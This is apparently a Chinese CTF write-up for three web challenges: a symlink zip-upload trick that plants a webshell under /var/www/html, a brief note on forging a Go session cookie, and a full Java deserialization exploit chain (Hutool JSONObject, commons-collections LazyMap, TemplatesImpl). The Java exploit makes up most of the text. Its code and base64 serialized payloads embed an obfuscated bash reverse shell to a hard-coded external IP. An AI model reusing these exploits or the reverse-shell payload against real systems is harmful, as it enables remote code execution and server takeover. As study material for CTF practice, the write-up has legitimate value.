## Unzip
#文件上传-软链接
```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
  
$finfo = finfo_open(FILEINFO_MIME_TYPE);  
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){    
	exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);  
};  
  
//only this!
```
上传软链接

```
# 制作指向/var/www/html的软链接
ln -s /var/www/html test
# 在test文件夹下生成一个shell 然后将test文件夹打包
zip -r shell.zip test
# 依次上传后可以直接访问shell
# 此时的文件结构
|-tmp
	|-test 软链接 将test文件夹指向/var/www/html
	|-test 文件夹
		|-shell.php
```

## go_session

伪造admin Cookie 

需要爆破key 通过是否admin身份的不同结果来完成确定key

后续是ssit

## deserbug
```JAVA
package app;  
  
import cn.hutool.json.JSONObject;  
import com.app.Myexpect;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import javassist.CannotCompileException;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.NotFoundException;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.Base64;  
import java.util.HashMap;  
  
  
public class exp {  
    public static void main(String[] args) throws Exception {  
        byte[] shellCode = shell();  
        byte[][] shell = {shellCode};  
        TemplatesImpl templates = new TemplatesImpl();  
        setFieldValue(templates,"_name","aaa");  
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
        setFieldValue(templates, "_bytecodes", shell);  
//        templates.newTransformer();  
        Myexpect myexpect = new Myexpect();  
        myexpect.setTargetclass(TrAXFilter.class);  
        myexpect.setTypeparam(new Class[]{Templates.class});  
        myexpect.setTypearg(new Object[]{templates});  
//        myexpect.getAnyexcept();  
        JSONObject jsonObject = new JSONObject();  
        jsonObject.put("aaa", "bbb");  
        ConstantTransformer constantTransformer = new ConstantTransformer(1);  
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(jsonObject, constantTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");  
        HashMap hashMap = new HashMap();  
        hashMap.put(tiedMapEntry, "www");  
        jsonObject.remove("111");  
        setFieldValue(constantTransformer,"iConstant",myexpect);  
        byte[] serialize = serialize(hashMap);  
        System.out.println(Base64.getEncoder().encodeToString(serialize));  
        String poc = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADMTExc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHBzcgAITXlleHBlY3TZgp/dqsFXiAIABUwACWFueWV4Y2VwdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4ADUwAC3RhcmdldGNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztbAAd0eXBlYXJndAATW0xqYXZhL2xhbmcvT2JqZWN0O1sACXR5cGVwYXJhbXQAEltMamF2YS9sYW5nL0NsYXNzO3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AA1bAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AFnB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAFzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ADUwACGZpbGVOYW1lcQB+AA1MAAptZXRob2ROYW1lcQB+AA14cAAAACJ0AANleHB0AAhleHAuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AFXhyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAjeHBwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABBMAAVfbmFtZXEAfgANTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAGYyv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcADAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA4ADwoADQAQAQAEY2FsYwgAEgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABQAFQoADQAWAQAGPGluaXQ+DAAYAAoKAAgAGQAhAAIACAAAAAAAAgAIAAkACgABAAsAAAAWAAIAAAAAAAq4ABESE7YAF1exAAAAAAABABgACgABAAsAAAARAAEAAQAAAAUqtwAasQAAAAAAAQAFAAAAAgAGcHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABljbi5odXRvb2wuanNvbi5KU09OT2JqZWN0+2rSTmENynYCAAFMAAZjb25maWd0ABtMY24vaHV0b29sL2pzb24vSlNPTkNvbmZpZzt4cgAdY24uaHV0b29sLmNvcmUubWFwLk1hcFdyYXBwZXKXk1QjQV+3cgMAAUwAA3Jhd3EAfgAEeHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHEAfgAAP0AAAAAAAAx3CAAAABAAAAABcQB+ADB0AANiYmJ4AHEAfgA6eHNyABljbi5odXRvb2wuanNvbi5KU09OQ29uZmlnAaleH6rPTOYCAAhaAA5jaGVja0R1cGxpY2F0ZVoACmlnbm9yZUNhc2VaAAtpZ25vcmVFcnJvcloAD2lnbm9yZU51bGxWYWx1ZVoAEnN0cmlwVHJhaWxpbmdaZXJvc1oAEHRyYW5zaWVudFN1cHBvcnRMAApkYXRlRm9ybWF0cQB+AA1MAA1rZXlDb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAQEBcHB4dAADd3d3eA==";  
//        String poc = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADMTExc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHBzcgAITXlleHBlY3TZgp/dqsFXiAIABUwACWFueWV4Y2VwdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4ADUwAC3RhcmdldGNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztbAAd0eXBlYXJndAATW0xqYXZhL2xhbmcvT2JqZWN0O1sACXR5cGVwYXJhbXQAEltMamF2YS9sYW5nL0NsYXNzO3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AA1bAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AFnB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAFzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ADUwACGZpbGVOYW1lcQB+AA1MAAptZXRob2ROYW1lcQB+AA14cAAAACB0AANleHB0AAhleHAuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AFXhyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAjeHBwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABBMAAVfbmFtZXEAfgANTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAH1yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcADAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA4ADwoADQAQAQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzgwT1M0eU16SXVNakEyTGpNM0x6SXpORFUySURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAEgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABQAFQoADQAWAQAGPGluaXQ+DAAYAAoKAAgAGQAhAAIACAAAAAAAAgAIAAkACgABAAsAAAAWAAIAAAAAAAq4ABESE7YAF1exAAAAAAABABgACgABAAsAAAARAAEAAQAAAAUqtwAasQAAAAAAAQAFAAAAAgAGcHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABljbi5odXRvb2wuanNvbi5KU09OT2JqZWN0+2rSTmENynYCAAFMAAZjb25maWd0ABtMY24vaHV0b29sL2pzb24vSlNPTkNvbmZpZzt4cgAdY24uaHV0b29sLmNvcmUubWFwLk1hcFdyYXBwZXKXk1QjQV+3cgMAAUwAA3Jhd3EAfgAEeHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHEAfgAAP0AAAAAAAAx3CAAAABAAAAABcQB+ADB0AANiYmJ4AHEAfgA6eHNyABljbi5odXRvb2wuanNvbi5KU09OQ29uZmlnAaleH6rPTOYCAAhaAA5jaGVja0R1cGxpY2F0ZVoACmlnbm9yZUNhc2VaAAtpZ25vcmVFcnJvcloAD2lnbm9yZU51bGxWYWx1ZVoAEnN0cmlwVHJhaWxpbmdaZXJvc1oAEHRyYW5zaWVudFN1cHBvcnRMAApkYXRlRm9ybWF0cQB+AA1MAA1rZXlDb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAQEBcHB4dAADd3d3eA==";  
        byte[] decode = Base64.getDecoder().decode(poc);  
        System.out.println(decode);  
        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(decode));  
        Object object = inputStream.readObject();  
    }  
    public static  byte[] serialize(Object object) throws IOException {  
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(object);  
        return byteArrayOutputStream.toByteArray();  
    }  
  
    public static void setFieldValue(Object obj,String field,Object val) throws NoSuchFieldException, IllegalAccessException {  
        Field field1=obj.getClass().getDeclaredField(field);  
        field1.setAccessible(true);  
        field1.set(obj,val);  
    }  
    public static byte[] shell() throws NotFoundException, CannotCompileException, IOException {  
        ClassPool classPool = ClassPool.getDefault();  
        CtClass ctClass = classPool.makeClass("Evil");  
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));  
        String shell = "Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjA2LjM3LzIzNDU2IDA+JjE=}|{base64,-d}|{bash,-i}\");";  
        ctClass.makeClassInitializer().insertBefore(shell);  
        return ctClass.toBytecode();  
    }  
}
```